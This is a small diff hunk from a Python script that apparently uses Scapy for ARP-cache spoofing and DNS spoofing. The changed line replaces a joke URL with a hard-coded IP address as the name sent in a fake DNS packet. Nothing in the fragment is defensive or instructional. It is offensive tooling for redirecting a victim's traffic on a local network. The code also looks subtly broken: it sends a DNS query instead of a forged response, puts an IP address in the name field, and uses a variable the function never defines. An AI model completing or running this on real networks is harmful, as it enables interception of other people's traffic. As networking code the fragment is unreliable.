@@ -12,7 +12,7 @@ def spoofarpcache(targetip, targetmac, sourceip):
 
 def sendFakeDNS(pkt):
     print(pkt)
-    dnsResPacket = IP(dst=targetip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="https://www.youtube.com/watch?v=dQw4w9WgXcQ%22"))
+    dnsResPacket = IP(dst=targetip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="61.13.148.37"))
     send(dnsResPacket)
 
 def DNSSpoofing(iptarget):
